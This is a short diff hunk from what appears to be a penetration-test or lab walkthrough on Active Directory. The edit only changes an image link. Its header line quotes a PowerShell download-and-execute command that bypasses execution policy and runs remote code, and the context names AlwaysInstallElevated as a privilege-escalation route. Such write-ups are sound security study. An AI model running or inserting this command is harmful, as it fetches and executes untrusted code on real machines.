@@ -126,7 +126,7 @@ powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://
 
 Bingo
 
-![[AD Chain 3-1793354015299.webp]]
+![](../0.%20Assets/AD%20Chain%203-1793367913572.webp)
 
 `AlwaysInstallElevated` appears to be our way in
 
